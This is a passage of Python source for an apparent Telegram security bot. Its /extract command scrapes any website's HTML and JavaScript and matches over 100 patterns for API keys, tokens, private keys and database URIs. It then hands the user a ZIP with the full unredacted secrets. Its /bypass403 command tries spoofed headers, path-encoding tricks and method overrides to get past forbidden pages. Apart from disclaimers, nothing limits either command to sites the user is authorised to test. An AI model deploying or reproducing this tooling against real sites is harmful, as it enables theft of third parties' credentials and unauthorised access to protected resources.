            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
# ══════════════════════════════════════════════════

_SECRET_PATTERNS = {
    # ── Cloud / AWS ────────────────────────────────
    "AWS Access Key":         (r'AKIA[0-9A-Z]{16}',                                    "🔴"),
    "AWS Secret Key":         (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}',       "🔴"),
    "AWS Session Token":      (r'FwoGZXIvYXdzE[a-zA-Z0-9/+]{100,}',                   "🔴"),
    "AWS Account ID":         (r'(?<!\d)\d{12}(?!\d)',                                  "🟡"),
    # ── Cloud / GCP / Azure ───────────────────────
    "GCP Service Account":    (r'"type"\s*:\s*"service_account"',                       "🔴"),
    "GCP API Key":            (r'(?i)gcp.{0,20}key.{0,10}[A-Za-z0-9_\-]{30,}',        "🔴"),
    "DigitalOcean Token":     (r'dop_v1_[a-f0-9]{64}',                                 "🔴"),
    "DigitalOcean Key":       (r'do_key_[a-f0-9]{40,}',                                "🔴"),
    "Cloudflare API Key":     (r'(?i)cloudflare.{0,20}[0-9a-f]{37}',                   "🔴"),
    "Cloudflare Global Key":  (r'(?i)x-auth-key["\s:=]+["\'][0-9a-f]{37}["\']',       "🔴"),
    "Azure ConnStr":          (r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+', "🔴"),
    "Azure SAS Token":        (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\s"\']{10,}', "🔴"),
    "Heroku API Key":         (r'(?i)heroku.{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "🔴"),
    "Netlify Token":          (r'(?i)netlify.{0,20}[0-9a-zA-Z_\-]{40,}',              "🔴"),
    "Vercel Token":           (r'(?i)vercel.{0,20}[0-9a-zA-Z_\-]{24,}',               "🟠"),
    "Render Token":           (r'rnd_[A-Za-z0-9]{32,}',                                "🟠"),
    "Railway Token":          (r'(?i)railway.{0,20}[0-9a-zA-Z_\-]{40,}',              "🟠"),
    # ── Payment ───────────────────────────────────
    "Stripe Secret":          (r'sk_live_[0-9a-zA-Z]{24,}',                            "🔴"),
    "Stripe Restricted":      (r'rk_live_[0-9a-zA-Z]{24,}',                            "🔴"),
    "Stripe Public":          (r'pk_live_[0-9a-zA-Z]{24,}',                            "🟡"),
    "Stripe Test Key":        (r'sk_test_[0-9a-zA-Z]{24,}',                            "🟡"),
    "PayPal Secret":          (r'(?i)paypal.{0,20}(?:secret|token).{0,10}[A-Za-z0-9_-]{30,}', "🔴"),
    "Square Access Token":    (r'EAAA[a-zA-Z0-9\-_]{60,}',                             "🔴"),
    "Braintree Token":        (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}', "🔴"),
    "Adyen API Key":          (r'AQE[a-zA-Z0-9]{62,}',                                 "🔴"),
    "Razorpay Key":           (r'rzp_live_[a-zA-Z0-9]{14}',                            "🔴"),
    # ── Auth / Identity ───────────────────────────
    "JWT Token":              (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
    "Private Key Block":      (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "🔴"),
    "Certificate":            (r'-----BEGIN CERTIFICATE-----',                          "🟡"),
    "Bearer Token":           (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',                  "🟠"),
    "Basic Auth Header":      (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',     "🟠"),
    "OAuth Client Secret":    (r'(?i)client[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🔴"),
    "Auth Token Generic":     (r'(?i)auth[_-]?token["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
    # ── Google / Firebase ─────────────────────────
    "Google API Key":         (r'AIza[0-9A-Za-z_-]{35}',                               "🔴"),
    "Firebase Config":        (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',              "🔴"),
    "Firebase DB URL":        (r'https://[a-z0-9-]+\.firebaseio\.com',                  "🟡"),
    "Firebase Storage":       (r'https://[a-z0-9-]+\.appspot\.com',                    "🟡"),
    "Google OAuth":           (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "🔴"),
    "Google Cloud Key":       (r'AIza[0-9A-Za-z\-_]{35}',                              "🔴"),
    # ── VCS / CI-CD ───────────────────────────────
    "GitHub Token":           (r'ghp_[0-9a-zA-Z]{36}',                                 "🔴"),
    "GitHub Fine-grained":    (r'github_pat_[0-9a-zA-Z_]{82}',                         "🔴"),
    "GitHub OAuth":           (r'gho_[0-9a-zA-Z]{36}',                                 "🔴"),
    "GitHub App Token":       (r'ghs_[0-9a-zA-Z]{36}',                                 "🔴"),
    "GitLab Token":           (r'glpat-[0-9a-zA-Z_-]{20}',                             "🔴"),
    "GitLab Runner":          (r'glrt-[0-9a-zA-Z_-]{20}',                              "🟠"),
    "NPM Token":              (r'npm_[A-Za-z0-9]{36}',                                 "🔴"),
    "CircleCI Token":         (r'(?i)circle.{0,20}[0-9a-f]{40}',                       "🔴"),
    "Travis CI Token":        (r'(?i)travis.{0,20}[0-9a-zA-Z_\-]{20,}',               "🟠"),
    "Jenkins Token":          (r'(?i)jenkins.{0,20}[0-9a-f]{32,}',                     "🔴"),
    # ── Messaging / Email ─────────────────────────
    "Slack Token":            (r'xox[baprs]-[0-9a-zA-Z\-]+',                           "🔴"),
    "Slack Webhook":          (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+', "🔴"),
    "Discord Webhook":        (r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+', "🟠"),
    "Telegram Token":         (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                        "🔴"),
    "Sendgrid Key":           (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',           "🔴"),
    "Mailgun API Key":        (r'key-[0-9a-zA-Z]{32}',                                 "🔴"),
    "Mailchimp API Key":      (r'[0-9a-f]{32}-us\d{1,2}',                              "🔴"),
    "Postmark Token":         (r'(?i)postmark.{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "🔴"),
    "Twilio Key":             (r'SK[0-9a-fA-F]{32}',                                   "🟠"),
    "Twilio AccountSID":      (r'AC[a-z0-9]{32}',                                      "🟡"),
    "Twilio Auth Token":      (r'(?i)twilio.{0,20}auth.{0,10}[0-9a-f]{32}',            "🔴"),
    "Vonage / Nexmo":         (r'(?i)nexmo.{0,20}api_secret["\s:=]+["\'][a-zA-Z0-9]{16}["\']', "🔴"),
    # ── AI / ML ───────────────────────────────────
    "OpenAI Key":             (r'sk-[a-zA-Z0-9]{48}',                                  "🔴"),
    "OpenAI Project Key":     (r'sk-proj-[a-zA-Z0-9\-_]{80,}',                        "🔴"),
    "Anthropic Key":          (r'sk-ant-[a-zA-Z0-9\-_]{90,}',                          "🔴"),
    "HuggingFace Token":      (r'hf_[a-zA-Z]{34}',                                     "🟡"),
    "Cohere API Key":         (r'(?i)cohere.{0,20}[a-zA-Z0-9_\-]{40}',                "🟠"),
    "Replicate Token":        (r'r8_[a-zA-Z0-9]{40}',                                  "🟠"),
    # ── Database ──────────────────────────────────
    "MongoDB URI":            (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',                  "🔴"),
    "MySQL DSN":              (r'mysql://[^\s"\'<>]{10,}',                               "🔴"),
    "PostgreSQL DSN":         (r'postgres(?:ql)?://[^\s"\'<>]{10,}',                    "🔴"),
    "Redis URI":              (r'redis://[^\s"\'<>:]+:[^\s"\'<>@]+@[^\s"\'<>]+',        "🔴"),
    "Elasticsearch":          (r'https?://[^:]+:[^@]+@[^\s"\'<>]*:9200',               "🔴"),
    "ClickHouse DSN":         (r'clickhouse://[^\s"\'<>]{10,}',                         "🔴"),
    "Cassandra Host":         (r'(?i)cassandra.{0,20}host["\s:=]+["\'][0-9.]+["\']',   "🟡"),
    "S3 Bucket URL":          (r'https://[a-z0-9\-\.]+\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com', "🟡"),
    # ── Secrets / Security ────────────────────────
    "HashiCorp Vault Token":  (r'hvs\.[a-zA-Z0-9_\-]{24,}',                           "🔴"),
    "Vault Generic Token":    (r'(?i)vault.{0,20}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{24,}["\']', "🔴"),
    "Generic Password":       (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
    "Secret Key":             (r'(?i)secret[_-]?key["\s:=]+["\'][a-zA-Z0-9!@#$%^&*_\-]{16,}["\']', "🟠"),
    "API Key Generic":        (r'(?i)api[_-]?key["\s:=]+["\'][a-zA-Z0-9_\-]{16,}["\']', "🟡"),
    "Access Key Generic":     (r'(?i)access[_-]?key["\s:=]+["\'][a-zA-Z0-9_\-]{16,}["\']', "🟡"),
    "Internal IP Leak":       (r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', "🟡"),
    # ── Maps / Geo ────────────────────────────────
    "Google Maps Key":        (r'AIza[0-9A-Za-z_-]{35}',                               "🟠"),
    "Mapbox Token":           (r'pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_\-]{22,}',          "🟠"),
    "HERE Maps Key":          (r'(?i)here.{0,10}apikey["\s:=]+["\'][a-zA-Z0-9_\-]{40}["\']', "🟠"),
    # ── Misc SaaS ────────────────────────────────
    "Zendesk Token":          (r'(?i)zendesk.{0,20}[a-zA-Z0-9_\-]{40,}',              "🟠"),
    "Shopify Token":          (r'shpat_[a-fA-F0-9]{32}',                               "🔴"),
    "Shopify Shared Secret":  (r'shpss_[a-fA-F0-9]{32}',                               "🔴"),
    "PagerDuty Key":          (r'(?i)pagerduty.{0,20}[a-zA-Z0-9+/]{20,}',             "🟠"),
    "Datadog API Key":        (r'(?i)datadog.{0,20}[0-9a-f]{32}',                      "🔴"),
    "New Relic Key":          (r'NRAK-[A-Z0-9]{27}',                                   "🔴"),
    "Sentry DSN":             (r'https://[0-9a-f]{32}@[a-z0-9.]+\.sentry\.io/\d+',    "🟠"),
    # ── V24: Additional SaaS / Dev tools ──────────────────────────────
    "Notion API Token":       (r'secret_[a-zA-Z0-9]{43}',                              "🔴"),
    "Airtable API Key":       (r'(?i)airtable.{0,20}[a-zA-Z0-9]{17}',                 "🟠"),
    "Linear API Key":         (r'lin_api_[a-zA-Z0-9]{40}',                             "🔴"),
    "Doppler Token":          (r'dp\.pt\.[a-zA-Z0-9]{40,}',                            "🔴"),
    "Infisical Token":        (r'infisical:[a-zA-Z0-9_\-]{40,}',                       "🔴"),
    "PyPI Token":             (r'pypi-[A-Za-z0-9_\-]{100,}',                           "🔴"),
    "Terraform Cloud Token":  (r'(?i)terraform.{0,20}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{20,}["\']', "🔴"),
    "Pulumi Token":           (r'pul-[a-zA-Z0-9]{40}',                                 "🔴"),
    "Okta API Token":         (r'(?i)okta.{0,20}[a-zA-Z0-9_-]{40}',                   "🔴"),
    "Auth0 Client Secret":    (r'(?i)auth0.{0,20}client.{0,10}secret["\s:=]+["\'][a-zA-Z0-9_\-]{40,}["\']', "🔴"),
    "Twitch Client Secret":   (r'(?i)twitch.{0,20}[a-zA-Z0-9_]{30}',                  "🟠"),
    "Twitter Bearer":         (r'AAAAAAAAAAAAAAAAAAAAA[a-zA-Z0-9%]+',                  "🟠"),
    "Instagram Token":        (r'(?i)instagram.{0,20}access.{0,10}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{40,}["\']', "🟠"),
    "Zoom JWT Secret":        (r'(?i)zoom.{0,20}[a-zA-Z0-9_\-]{40}',                  "🟠"),
    "Asana PAT":              (r'0\/[0-9]{16}:[a-zA-Z0-9]{32}',                        "🔴"),
    "Monday.com Token":       (r'(?i)monday.{0,20}[a-zA-Z0-9_\-]{40,}',               "🟠"),
    "Intercom Token":         (r'(?i)intercom.{0,20}[a-zA-Z0-9_\-]{32,}',             "🟠"),
    "Algolia API Key":        (r'(?i)algolia.{0,20}[a-zA-Z0-9]{32}',                   "🟠"),
    "Elastic APM":            (r'(?i)elastic.{0,20}apm.{0,20}[a-zA-Z0-9_\-]{40}',    "🔴"),
    "Grafana API Key":        (r'(?i)grafana.{0,20}[a-zA-Z0-9_\-]{40}',               "🔴"),
    "GitBook Token":          (r'(?i)gitbook.{0,20}[a-zA-Z0-9_\-]{40}',               "🟠"),
    "Webhook Secret":         (r'(?i)webhook[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
    "Encryption Key Generic": (r'(?i)(?:aes|encrypt|cipher)[_-]?key["\s:=]+["\'][a-zA-Z0-9/+=]{16,}["\']', "🔴"),
    "HMAC Secret":            (r'(?i)hmac[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
    "Database Password":      (r'(?i)db[_-]?pass(?:word)?["\s:=]+["\'][^"\']{8,}["\']', "🟠"),
    "JWT Secret":             (r'(?i)jwt[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-!@#$%^&*]{16,}["\']', "🔴"),
}

async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/extract https://example.com`\n\n"
            "🔑 Scans HTML source + all external/inline JS files for:\n"
            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
            "private keys, MongoDB URIs, passwords & more.\n\n"
            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
            "📦 *Always exports a ZIP* containing:\n"
            "  • `index.html` — raw HTML source\n"
            "  • `js/` folder — all external JS files\n"
            "  • `inline_scripts/` — all inline `<script>` blocks\n"
            "  • `report.json` — full findings report\n"
            "  • `report.txt` — human-readable summary\n\n"
            "⚠️ _For authorized security research only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    # Skip rate limit if called internally from /discover
    if not context.user_data.get('_discover_internal'):
        allowed, wait = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
            return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname

    msg = await update.effective_message.reply_text(
        f"🔑 *Secret Scan — `{domain}`*\n\n"
        f"⬇️ Phase 1: Fetching HTML source\n"
        f"📦 Phase 2: Downloading JS bundles\n"
        f"🔍 Phase 3: `{len(_SECRET_PATTERNS)}` pattern matching\n"
        f"🗜️ Phase 4: Building ZIP\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_extract():
        session   = requests.Session()
        session.headers.update(_get_headers())

        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── Build source map ──────────────────────────────
        # sources = { filename_in_zip : content_str }
        sources        = {}
        source_origins = {}   # filename → original URL or tag info
        inline_idx     = 0
        js_idx         = 0

        # 1. Main HTML
        sources["index.html"]        = resp.text
        source_origins["index.html"] = url

        # 2. External JS + inline scripts
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                js_url    = urljoin(url, src) if not src.startswith('http') else src
                js_safe, _ = is_safe_url(js_url)
                if not js_safe:
                    continue
                try:
                    jr = session.get(js_url, timeout=12, verify=False)
                    if jr.status_code == 200 and jr.text.strip():
                        # Make a safe filename from the URL path
                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
                        # Ensure .js extension
                        if not raw_name.endswith('.js'):
                            raw_name += '.js'
                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
                        fname     = f"js/{js_idx:03d}_{safe_name}"
                        sources[fname]        = jr.text
                        source_origins[fname] = js_url
                        js_idx += 1
                except Exception:
                    pass
            elif script.string and script.string.strip():
                content_str = script.string.strip()
                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                inline_idx += 1

        # ── Scan all sources ──────────────────────────────
        findings  = []
        seen_keys = set()

        for fname, content in sources.items():
            file_findings = []
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    val = match.group(0)
                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
                    dedup_key = stype + val[:40]
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    # Redacted copy for Telegram display
                    if len(val) > 16:
                        redacted = val[:8] + "…" + val[-4:]
                    else:
                        redacted = val[:6] + "…"
                    file_findings.append({
                        "type":     stype,
                        "risk":     risk,
                        "value_redacted": redacted,
                        "value_full":     val,       # full value stored in ZIP only
                        "file":     fname,
                        "origin":   source_origins.get(fname, ""),
                        "line":     content[:match.start()].count('\n') + 1,
                    })
            findings.extend(file_findings)

        return sources, source_origins, findings

    try:
        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
        return

    # ── Sort findings by risk ────────────────────────────
    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))

    critical = sum(1 for f in findings if f["risk"] == "🔴")
    high     = sum(1 for f in findings if f["risk"] == "🟠")
    med      = sum(1 for f in findings if f["risk"] == "🟡")

    # ── Build report.txt (human readable, full values) ──
    txt_lines = [
        f"=" * 60,
        f"  EXTRACT REPORT — {domain}",
        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"  URL: {url}",
        f"=" * 60,
        f"",
        f"SUMMARY",
        f"-------",
        f"Sources scanned : {len(sources)} files",
        f"Patterns checked: {len(_SECRET_PATTERNS)}",
        f"Findings total  : {len(findings)}",
        f"  Critical (🔴) : {critical}",
        f"  High     (🟠) : {high}",
        f"  Medium   (🟡) : {med}",
        f"",
        f"FILES SCANNED",
        f"-------------",
    ]
    for fname, origin in source_origins.items():
        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")

    txt_lines += ["", "FINDINGS", "--------"]
    if findings:
        for i, f in enumerate(findings, 1):
            txt_lines += [
                f"",
                f"[{i:03d}] {f['risk']} {f['type']}",
                f"  File  : {f['file']}",
                f"  Line  : {f['line']}",
                f"  Origin: {f['origin'][:80]}",
                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
            ]
    else:
        txt_lines.append("  No secrets found.")

    txt_lines += [
        "",
        "=" * 60,
        "  ⚠  This report contains unredacted values.",
        "  For authorized security research only.",
        "=" * 60,
    ]
    report_txt = "\n".join(txt_lines)

    # ── Build report.json ────────────────────────────────
    report_json = json.dumps({
        "domain":          domain,
        "url":             url,
        "scanned_at":      datetime.now().isoformat(),
        "files_scanned":   list(source_origins.values()),
        "pattern_count":   len(_SECRET_PATTERNS),
        "findings_count":  len(findings),
        "summary":         {"critical": critical, "high": high, "medium": med},
        "findings": [{
            "type":   f["type"],
            "risk":   f["risk"],
            "value":  f["value_full"],
            "file":   f["file"],
            "line":   f["line"],
            "origin": f["origin"],
        } for f in findings],
        "files": {fname: source_origins[fname] for fname in sources},
    }, ensure_ascii=False, indent=2)

    # ── Build ZIP in memory ──────────────────────────────
    await msg.edit_text(
        f"🗜️ Building ZIP for `{domain}`...\n"
        f"📂 `{len(sources)}` source files + reports",
        parse_mode='Markdown'
    )

    import io
    zip_buffer = io.BytesIO()
    safe_domain = re.sub(r'[^\w\-]', '_', domain)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name    = f"extract_{safe_domain}_{ts}.zip"

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Source files
        for fname, content in sources.items():
            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
        # Reports
        zf.writestr("report.txt",  report_txt.encode('utf-8'))
        zf.writestr("report.json", report_json.encode('utf-8'))
        # README
        _js_count     = sum(1 for f in sources if f.startswith("js/"))
        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
        readme = (
            f"EXTRACT SCAN — {domain}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"CONTENTS\n"
            f"  sources/index.html           — Raw HTML page\n"
            f"  sources/js/                  — External JS files ({_js_count} files)\n"
            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
            f"  report.txt                   — Human-readable findings (FULL values)\n"
            f"  report.json                  — Machine-readable JSON report\n\n"
            f"FINDINGS: {len(findings)} total  "
            f"(Critical:{critical} High:{high} Medium:{med})\n"
        )
        zf.writestr("README.txt", readme.encode('utf-8'))

    zip_buffer.seek(0)
    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024

    # ── Send Telegram summary (redacted) ────────────────
    if findings:
        tg_lines = [
            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
            f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
            f"📂 Scanned: `{len(sources)}` files\n",
        ]
        for f in findings[:15]:
            tg_lines.append(
                f"{f['risk']} *{f['type']}*\n"
                f"   Value: `{f['value_redacted']}`\n"
                f"   File:  `{f['file']}`  Line `{f['line']}`"
            )
        if len(findings) > 15:
            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
    else:
        tg_lines = [
            f"✅ *No Secrets Found*",
            f"🔗 `{domain}`",
            f"📂 Sources scanned: `{len(sources)}` files",
            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
            f"\n_ZIP contains all raw source files for manual review._",
        ]

    tg_text = "\n".join(tg_lines)
    try:
        if len(tg_text) > 4000:
            await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
        else:
            await msg.edit_text(tg_text, parse_mode='Markdown')
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ── Send ZIP ─────────────────────────────────────────
    cap = (
        f"📦 *Extract ZIP — `{domain}`*\n"
        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
        f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
        f"📄 `report.txt` — full unredacted values\n"
        f"📋 `report.json` — machine-readable\n"
        f"📁 `sources/` — raw HTML + JS files"
    )
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buffer,
            filename=zip_name,
            caption=cap,
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
            parse_mode='Markdown'
        )



# ══════════════════════════════════════════════════
# 🔓  /bypass403 — 403 Forbidden Bypass Tester
# ══════════════════════════════════════════════════

_BYPASS_HEADERS = [
    {"X-Original-URL":             "{path}"},
    {"X-Rewrite-URL":              "{path}"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Forwarded-For":            "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Remote-Addr":              "127.0.0.1"},
    {"X-Host":                     "localhost"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-ProxyUser-Ip":             "127.0.0.1"},
    {"Referer":                    "{url}"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Client-IP":                  "127.0.0.1"},
    {"CF-Connecting-IP":           "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Frame-Options":            "Allow"},
    {"X-WAF-Bypass":               "1"},
    {"X-Bypass":                   "1"},
    {"Authorization":              "Bearer null"},
]

_BYPASS_PATH_VARIANTS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "/{path_no_slash}%20",
    "/{path_no_slash}%09",
    "/{path_no_slash}%00",
    "/{path_no_slash}..;/",
    "/{path_no_slash};/",
    "/{path_no_slash}?",
    "//{path_no_slash}",
    "/{path_upper}",
    "/{path_lower}",
    "{path_dot_slash}",
]

_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

def _bypass_sync(url: str) -> list:
    """Run all 403 bypass techniques against a URL."""
    parsed     = urlparse(url)
    path       = parsed.path or "/"
    path_clean = path.lstrip("/")
    base       = f"{parsed.scheme}://{parsed.netloc}"
    results    = []


    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
               label: str = "") -> dict | None:
        try:
            h = dict(_get_headers())
            if extra_headers:
                # Resolve {path} / {url} placeholders in header values
                for k, v in extra_headers.items():
                    v = v.replace("{path}", path).replace("{url}", url)
                    h[k] = v
            r = requests.request(
                method, test_url, headers=h,
                timeout=8, verify=False,
                allow_redirects=False
            )
            return {
                "url":    test_url,
                "method": method,
                "status": r.status_code,
                "size":   len(r.content),
                "label":  label,
                "headers": dict(r.headers),
            }
        except Exception:
            return None

    # ── Baseline: confirm it's actually 403 ────────
    baseline = _probe(url, label="baseline")
    if not baseline:
        return []
    results.append({**baseline, "technique": "Baseline"})
    baseline_status = baseline["status"]
    baseline_size   = baseline["size"]

    def _is_bypass(r: dict) -> bool:
        if not r:
            return False
        st = r["status"]
        # Success: 200/201/204/301/302 when baseline was 403/401
        if baseline_status in (403, 401):
            if st in (200, 201, 204, 301, 302):
                return True
            # Different size even on 403 might indicate WAF bypass
            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
                return True
        return False

    # ── Header manipulation ──────────────────────────
    for hdr_template in _BYPASS_HEADERS:
        hdrs = {}
        for k, v in hdr_template.items():
            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
        r = _probe(url, hdrs, label=label)
        if r:
            r["technique"] = "header_manipulation"
            results.append(r)

    # ── Path variants ────────────────────────────────
    path_variants = [
        (f"{base}{path}/",                    "path/"),
        (f"{base}{path}//",                   "path//"),
        (f"{base}{path}/.",                   "path/."),
        (f"{base}/{path_clean}%20",           "url_encode_space"),
        (f"{base}/{path_clean}%09",           "url_encode_tab"),
        (f"{base}/{path_clean}%00",           "null_byte"),
        (f"{base}/{path_clean}..;/",          "path_dotdot"),
        (f"{base}/{path_clean};/",            "semicolon"),
        (f"{base}//{path_clean}",             "double_slash"),
        (f"{base}/{path_clean.upper()}",      "uppercase"),
        (f"{base}/{path_clean.lower()}",      "lowercase"),
        (f"{base}/{path_clean}?anything",     "query_append"),
        (f"{base}/{path_clean}#",             "fragment"),
        (f"{base}/./{ path_clean}",           "dot_prefix"),
        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
    ]
    for test_url, label in path_variants:
        safe_ok, _ = is_safe_url(test_url)
        if not safe_ok:
            continue
        r = _probe(test_url, label=label)
        if r:
            r["technique"] = "path_variant"
            results.append(r)

    # ── HTTP method override ─────────────────────────
    for method in _BYPASS_METHODS:
        r = _probe(url, method=method, label=f"Method: {method}")
        if r:
            r["technique"] = "method_override"
            results.append(r)

    # ── Method override via header ───────────────────
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = _probe(url,
                   extra_headers={"X-HTTP-Method-Override": method,
                                  "X-Method-Override": method},
                   label=f"X-HTTP-Method-Override: {method}")
        if r:
            r["technique"] = "method_override_header"
            results.append(r)

    # ── Content-Type tricks ──────────────────────────
    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                   method="POST", label=f"POST Content-Type: {ct}")
        if r:
            r["technique"] = "content_type"
            results.append(r)

    # Tag bypasses
    for res in results:
        res["bypassed"] = _is_bypass(res)

    return results


async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
            "🔓 *Tests 50+ bypass techniques:*\n"
            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
            "  • X-HTTP-Method-Override header\n"
            "  • Content-Type tricks\n"
            "  • URL encoding bypass (%20, %09, %00)\n\n"
            "⚠️ _For authorized security testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "403 Bypass"
    allowed, wait = check_rate_limit(uid)
